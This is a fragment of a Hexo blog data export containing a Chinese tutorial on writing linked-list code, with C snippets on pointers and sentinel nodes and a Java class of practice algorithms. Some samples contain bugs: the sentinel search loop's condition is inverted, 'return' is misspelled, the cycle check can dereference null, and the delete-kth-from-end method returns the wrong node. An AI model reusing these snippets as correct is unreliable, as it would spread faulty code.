[]).push({});\n</script>\n"},{"title":"算法-怎样写好链表代码","date":"2018-09-13T03:27:46.000Z","_content":"\n\n上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。\n\n为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？\n\n只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？\n\n当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。\n\n### 理解指针或引用的含义\n\n事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。\n\n有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。\n\n接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。\n\n实际上，对于指针的理解，只需要记住下面这句话就可以了：**将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量**。\n\n在编写链表代码的时候，经常会有这样的代码：p->next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p->next = p->next->next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。\n\n掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。\n\n### 警惕指针丢失和内存泄露\n\n不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。\n\n{% asset_img 链表插入.jpg %}\n\n如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。\n\n```C\np->next = c; // 将p的next指针指向c结点\nc->next = p->next; //将c结点next指针指向b结点\n```\n\n当p->next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c->next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。\n\n对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。\n\n### 利用哨兵简化实现难度\n\n首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。\n\n```C\nnew_node->next = p->next; \np->next = new_node; \n```\n\n但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。\n\n```C\nif (head == null)\n{\n\thead = new_node;\n}\n```\n\n同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：\n\n```C\np->next = p->next->next；\n```\n\n但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：\n\n```C\nif (head->next == null)\n{\n\thead = null;\n}\n```\n\n可以看出，**针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理**。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？\n\n这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。\n\n还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。\n\n如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做**带头链表**，相反，没有哨兵结点的链表叫做**不带头链表**。\n\n如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。\n\n{% asset_img 带头链表.jpg %}\n\n实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。\n\n代码一：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\n\tint i=0;\n\t// 这里有两个比较操作： i<n 和 a[i] == key\n\twhile(i<n){\n\t\tif(a[i] == key){\n\t\t\tretrun i;\n\t\t}\n\t\t++i;\n\t}\n\n\tretrun -1;\n}\n```\n\n代码二：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\n// 为了更好的解释，这里举了个例子来说明\n// a = {4,2,3,5,9,6} key = 7\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\t// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值\n\tif(a[n-1] == key){\n\t\treturn n-1;\n\t}\n\t// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6\n\tchar temp = a[n-1];\n\t// 把key值放到数组a[n-1]，此时a={4,2,3,5,9,7}\n\ta[n-1] = key;\n\n\tint i=0;\n\t// 此时while循环比起代码一，少了i<n这个比较操作\n\twhile(a[i] == key){\n\t\t++i;\n\t}\n\t// 将数组a[n-1] 恢复为原来的值\n\ta[n-1] = temp;\n\n\t// 如果i = n-1，说明数组中没有要找的key\n\tif(i == n-1){\n\t\treturn -1;\n\t}\n\t// 否则，说明找到了key，位置为i\n\telse{\n\t\treturn i;\n\t}\n}\n```\n\n对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。\n\n当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。\n\n### 重点留意边界条件处理\n\n软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。\n\n我经常用来检查链表代码是否正确执行的边界条件有这么几个：\n\n* 如果链表为空时，代码是否能正常工作？\n* 如果一个链表只包含了一个结点，代码能否正常工作？\n* 如果链表只包含两个结点时，代码能否正常工作？\n* 代码逻辑在处理头结点和尾结点时，是否能正常工作？\n\n当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。\n\n当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。\n\n其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。\n\n### 举列画图，辅助思考\n\n对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。\n\n你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：\n\n{% asset_img 举例.jpg%}\n\n看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。\n\n### 多写多练，没有捷径\n\n如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。\n\n下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。\n\n* 单链表反转\n* 链表中环的检测\n* 两个有序链表合并\n* 删除链表倒数第n个结点\n* 求链表的中间结点\n\n我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。\n\n```java\n/**\n * 链表的一些算法题目\n */\npublic class LinkListAlgorithm {\n    public static void main(String[] args) {\n        // 第一个链表，检测是否有环\n        System.out.println(\"链表中环的检测\");\n        Node<Integer> n1 = new Node<>(1);\n        Node<Integer> n2 = new Node<>(2);\n        Node<Integer> n3 = new Node<>(3);\n        n1.next = n2;\n        n2.next = n3;\n        n3.next = n1; // 1->2->3->1\n        System.out.println(isLoop(n1)); // true\n        System.out.println(\"==========================================\");\n        // 链表反转\n        System.out.println(\"链表反转\");\n        Node<Integer> n4 = new Node<>(4);\n        Node<Integer> n5 = new Node<>(5);\n        Node<Integer> n6 = new Node<>(6);\n        Node<Integer> n7 = new Node<>(7);\n        n4.next = n5;\n        n5.next = n6;\n        n6.next = n7;\n        System.out.println(printLinkList(n4)); // 4->5->6->7\n        Node<Integer> head = reverse(n4);\n        System.out.println(printLinkList(head)); // 7->6->5->4\n        System.out.println(\"==========================================\");\n\n        // 求链表的中间节点\n        System.out.println(\"求链表的中间节点\");\n        Node<Integer> n8 = new Node<>(8);\n        Node<Integer> n9 = new Node<>(9);\n        Node<Integer> n10 = new Node<>(10);\n        Node<Integer> n11 = new Node<>(11);\n        Node<Integer> n12 = new Node<>(12);\n        n8.next = n9;\n        n9.next = n10;\n        n10.next = n11;\n        n11.next = n12; // 8->9->10->11->12\n        System.out.println(printLinkList(n8));\n        Node<Integer> mid = middle(n8);\n        System.out.println(\"中间节点是： \" + mid.val);  // 10\n        System.out.println(\"==========================================\");\n\n        // 有序链表合并\n        System.out.println(\"有序链表合并\");\n        Node<Integer> n13 = new Node<>(13);\n        Node<Integer> n14 = new Node<>(14);\n        Node<Integer> n15 = new Node<>(15);\n        n13.next = n14;\n        n14.next = n15;\n        System.out.println(\"第一个链表： \"+printLinkList(n8));\n        System.out.println(\"第二个链表： \"+printLinkList(n13));\n        head = merge(n8, n13);\n        System.out.println(\"合并后的链表： \"+printLinkList(head));\n\n        System.out.println(\"==========================================\");\n        // 删除倒数第2个节点\n        Node<Integer> n16 = new Node<>(16);\n        Node<Integer> n17 = new Node<>(17);\n        Node<Integer> n18 = new Node<>(18);\n        Node<Integer> n19 = new Node<>(19);\n        n16.next = n17;\n        n17.next = n18;\n        n18.next = n19;\n        System.out.println(\"删除前： \"+printLinkList(n16));\n        head = deleteLastKDesc(n16, 3);\n        System.out.println(\"删除后： \"+printLinkList(n16));\n    }\n\n    /** 合并两个有序链表 */\n    private static Node<Integer> merge(Node<Integer> n1, Node<Integer> n2) {\n        // 确定新链表头结点\n        Node<Integer> head, p = n1, q = n2;\n        if (p.val > q.val){\n            head = n2;\n            q = q.next;\n        }else{\n            head = n1;\n            p = p.next;\n        }\n        Node<Integer> r = head;\n        while (p!=null &&q!=null){\n            if (p.val < q.val){\n                r.next = p;\n                p = p.next;\n            }else {\n                r.next = q;\n                q = q.next;\n            }\n            r = r.next;\n        }\n        if (p!=null){\n            r.next = p;\n        }else{\n            r.next = q;\n        };\n        return head;\n    }\n\n    /**查找链表中间节点*/\n    private static Node<Integer> middle(Node<Integer> head) {\n        if (head==null) return null;\n        Node<Integer> p = head;\n        Node<Integer> q = head;\n        while (q.next !=null && q.next.next!=null){\n            q = q.next.next;\n            p = p.next;\n        }\n        return p;\n    }\n\n    /** 链表中环的检测*/\n    private static boolean isLoop(Node<Integer> head){\n        // 采用快慢指针法 如果两个指针相遇，则说明有环\n        Node<Integer> p = head;\n        Node<Integer> q = head.next.next;\n        while (q!=null){\n            p = p.next;\n            q = q.next.next;\n            if (q == p){\n                return true;\n            }\n        }\n        return false;\n    }\n    /**反转链表*/\n    private static Node<Integer> reverse(Node<Integer> head){\n        if (head.next == null)return head;\n        Node<Integer> p;\n        Node<Integer> q;\n        Node<Integer> r;\n        p = head;\n        q = p.next;\n        p.next = null;\n        while (q != null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        return p;\n    }\n\n    /**删除链表倒数第K个结点*/\n    private static Node<Integer> deleteLastKDesc(Node<Integer> head, int k){\n        if (head == null || k <0) return null;\n        Node<Integer> p = head;\n\n        while (p != null){\n            p = p.next;\n            k--;\n        }\n        if (k == 0){\n            return head.next;\n        }\n\n        if (k < 0){\n            p = head;\n            while (++k != 0){\n                p = p.next;\n            }\n            p.next = p.next.next;\n        }\n        return p;\n    }\n\n    private static class Node<E> {\n        E val;\n        Node<E> next;\n        Node(E e){\n            this.val = e;\n        }\n    }\n    private static String printLinkList(Node<Integer> head){\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        while (head !=null){\n            if (head.next !=null)\n                sb.append(head.val).append(\", \");\n            else\n                sb.append(head.val);\n            head = head.next;\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n}\n\n```\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","source":"_posts/算法-怎样写好链表代码.md","raw":"---\ntitle: 算法-怎样写好链表代码\ndate: 2018-09-13 11:27:46\ntags: ['算法','链表']\ncategories: 算法\n---\n\n\n上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。\n\n为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？\n\n只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？\n\n当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。\n\n### 理解指针或引用的含义\n\n事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。\n\n有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。\n\n接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。\n\n实际上，对于指针的理解，只需要记住下面这句话就可以了：**将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量**。\n\n在编写链表代码的时候，经常会有这样的代码：p->next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p->next = p->next->next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。\n\n掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。\n\n### 警惕指针丢失和内存泄露\n\n不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。\n\n{% asset_img 链表插入.jpg %}\n\n如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。\n\n```C\np->next = c; // 将p的next指针指向c结点\nc->next = p->next; //将c结点next指针指向b结点\n```\n\n当p->next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c->next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。\n\n对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。\n\n### 利用哨兵简化实现难度\n\n首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。\n\n```C\nnew_node->next = p->next; \np->next = new_node; \n```\n\n但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。\n\n```C\nif (head == null)\n{\n\thead = new_node;\n}\n```\n\n同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：\n\n```C\np->next = p->next->next；\n```\n\n但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：\n\n```C\nif (head->next == null)\n{\n\thead = null;\n}\n```\n\n可以看出，**针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理**。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？\n\n这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。\n\n还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。\n\n如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做**带头链表**，相反，没有哨兵结点的链表叫做**不带头链表**。\n\n如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。\n\n{% asset_img 带头链表.jpg %}\n\n实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。\n\n代码一：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\n\tint i=0;\n\t// 这里有两个比较操作： i<n 和 a[i] == key\n\twhile(i<n){\n\t\tif(a[i] == key){\n\t\t\tretrun i;\n\t\t}\n\t\t++i;\n\t}\n\n\tretrun -1;\n}\n```\n\n代码二：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\n// 为了更好的解释，这里举了个例子来说明\n// a = {4,2,3,5,9,6} key = 7\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\t// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值\n\tif(a[n-1] == key){\n\t\treturn n-1;\n\t}\n\t// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6\n\tchar temp = a[n-1];\n\t// 把key值放到数组a[n-1]，此时a={4,2,3,5,9,7}\n\ta[n-1] = key;\n\n\tint i=0;\n\t// 此时while循环比起代码一，少了i<n这个比较操作\n\twhile(a[i] == key){\n\t\t++i;\n\t}\n\t// 将数组a[n-1] 恢复为原来的值\n\ta[n-1] = temp;\n\n\t// 如果i = n-1，说明数组中没有要找的key\n\tif(i == n-1){\n\t\treturn -1;\n\t}\n\t// 否则，说明找到了key，位置为i\n\telse{\n\t\treturn i;\n\t}\n}\n```\n\n对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。\n\n当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。\n\n### 重点留意边界条件处理\n\n软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。\n\n我经常用来检查链表代码是否正确执行的边界条件有这么几个：\n\n* 如果链表为空时，代码是否能正常工作？\n* 如果一个链表只包含了一个结点，代码能否正常工作？\n* 如果链表只包含两个结点时，代码能否正常工作？\n* 代码逻辑在处理头结点和尾结点时，是否能正常工作？\n\n当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。\n\n当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。\n\n其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。\n\n### 举列画图，辅助思考\n\n对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。\n\n你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：\n\n{% asset_img 举例.jpg%}\n\n看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。\n\n### 多写多练，没有捷径\n\n如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。\n\n下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。\n\n* 单链表反转\n* 链表中环的检测\n* 两个有序链表合并\n* 删除链表倒数第n个结点\n* 求链表的中间结点\n\n我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。\n\n```java\n/**\n * 链表的一些算法题目\n */\npublic class LinkListAlgorithm {\n    public static void main(String[] args) {\n        // 第一个链表，检测是否有环\n        System.out.println(\"链表中环的检测\");\n        Node<Integer> n1 = new Node<>(1);\n        Node<Integer> n2 = new Node<>(2);\n        Node<Integer> n3 = new Node<>(3);\n        n1.next = n2;\n        n2.next = n3;\n        n3.next = n1; // 1->2->3->1\n        System.out.println(isLoop(n1)); // true\n        System.out.println(\"==========================================\");\n        // 链表反转\n        System.out.println(\"链表反转\");\n        Node<Integer> n4 = new Node<>(4);\n        Node<Integer> n5 = new Node<>(5);\n        Node<Integer> n6 = new Node<>(6);\n        Node<Integer> n7 = new Node<>(7);\n        n4.next = n5;\n        n5.next = n6;\n        n6.next = n7;\n        System.out.println(printLinkList(n4)); // 4->5->6->7\n        Node<Integer> head = reverse(n4);\n        System.out.println(printLinkList(head)); // 7->6->5->4\n        System.out.println(\"==========================================\");\n\n        // 求链表的中间节点\n        System.out.println(\"求链表的中间节点\");\n        Node<Integer> n8 = new Node<>(8);\n        Node<Integer> n9 = new Node<>(9);\n        Node<Integer> n10 = new Node<>(10);\n        Node<Integer> n11 = new Node<>(11);\n        Node<Integer> n12 = new Node<>(12);\n        n8.next = n9;\n        n9.next = n10;\n        n10.next = n11;\n        n11.next = n12; // 8->9->10->11->12\n        System.out.println(printLinkList(n8));\n        Node<Integer> mid = middle(n8);\n        System.out.println(\"中间节点是： \" + mid.val);  // 10\n        System.out.println(\"==========================================\");\n\n        // 有序链表合并\n        System.out.println(\"有序链表合并\");\n        Node<Integer> n13 = new Node<>(13);\n        Node<Integer> n14 = new Node<>(14);\n        Node<Integer> n15 = new Node<>(15);\n        n13.next = n14;\n        n14.next = n15;\n        System.out.println(\"第一个链表： \"+printLinkList(n8));\n        System.out.println(\"第二个链表： \"+printLinkList(n13));\n        head = merge(n8, n13);\n        System.out.println(\"合并后的链表： \"+printLinkList(head));\n\n        System.out.println(\"==========================================\");\n        // 删除倒数第2个节点\n        Node<Integer> n16 = new Node<>(16);\n        Node<Integer> n17 = new Node<>(17);\n        Node<Integer> n18 = new Node<>(18);\n        Node<Integer> n19 = new Node<>(19);\n        n16.next = n17;\n        n17.next = n18;\n        n18.next = n19;\n        System.out.println(\"删除前： \"+printLinkList(n16));\n        head = deleteLastKDesc(n16, 3);\n        System.out.println(\"删除后： \"+printLinkList(n16));\n    }\n\n    /** 合并两个有序链表 */\n    private static Node<Integer> merge(Node<Integer> n1, Node<Integer> n2) {\n        // 确定新链表头结点\n        Node<Integer> head, p = n1, q = n2;\n        if (p.val > q.val){\n            head = n2;\n            q = q.next;\n        }else{\n            head = n1;\n            p = p.next;\n        }\n        Node<Integer> r = head;\n        while (p!=null &&q!=null){\n            if (p.val < q.val){\n                r.next = p;\n                p = p.next;\n            }else {\n                r.next = q;\n                q = q.next;\n            }\n            r = r.next;\n        }\n        if (p!=null){\n            r.next = p;\n        }else{\n            r.next = q;\n        };\n        return head;\n    }\n\n    /**查找链表中间节点*/\n    private static Node<Integer> middle(Node<Integer> head) {\n        if (head==null) return null;\n        Node<Integer> p = head;\n        Node<Integer> q = head;\n        while (q.next !=null && q.next.next!=null){\n            q = q.next.next;\n            p = p.next;\n        }\n        return p;\n    }\n\n    /** 链表中环的检测*/\n    private static boolean isLoop(Node<Integer> head){\n        // 采用快慢指针法 如果两个指针相遇，则说明有环\n        Node<Integer> p = head;\n        Node<Integer> q = head.next.next;\n        while (q!=null){\n            p = p.next;\n            q = q.next.next;\n            if (q == p){\n                return true;\n            }\n        }\n        return false;\n    }\n    /**反转链表*/\n    private static Node<Integer> reverse(Node<Integer> head){\n        if (head.next == null)return head;\n        Node<Integer> p;\n        Node<Integer> q;\n        Node<Integer> r;\n        p = head;\n        q = p.next;\n        p.next = null;\n        while (q != null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        return p;\n    }\n\n    /**删除链表倒数第K个结点*/\n    private static Node<Integer> deleteLastKDesc(Node<Integer> head, int k){\n        if (head == null || k <0) return null;\n        Node<Integer> p = head;\n\n        while (p != null){\n            p = p.next;\n            k--;\n        }\n        if (k == 0){\n            return head.next;\n        }\n\n        if (k < 0){\n            p = head;\n            while (++k != 0){\n                p = p.next;\n            }\n            p.next = p.next.next;\n        }\n        return p;\n    }\n\n    private static class Node<E> {\n        E val;\n        Node<E> next;\n        Node(E e){\n            this.val = e;\n        }\n    }\n    private static String printLinkList(Node<Integer> head){\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        while (head !=null){\n            if (head.next !=null)\n                sb.append(head.val).append(\", \");\n            else\n                sb.append(head.val);\n            head = head.next;\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n}\n\n```\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","slug":"算法-怎样写好链表代码","published":1,"updated":"2019-06-26T03:52:03.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2nk006ao25ty7y6exuj","content":"<p>上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。</p>\n<p>为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？</p>\n<p>只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？</p>\n<p>当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。</p>\n<h3 id=\"理解指针或引用的含义\"><a href=\"#理解指针或引用的含义\" class=\"headerlink\" 